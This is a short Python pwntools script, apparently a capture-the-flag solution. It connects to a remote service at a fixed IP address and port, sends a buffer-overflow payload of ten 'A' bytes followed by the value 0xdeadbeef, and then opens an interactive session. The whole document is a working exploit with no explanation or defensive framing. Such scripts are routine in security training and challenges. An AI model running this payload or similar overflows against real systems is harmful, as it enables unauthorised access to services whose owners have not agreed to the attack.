from pwn import *

r = remote('152.118.201.241', '3005')
r.sendline(b'AAAAAAAAAA\xef\xbe\xad\xde')

r.interactive()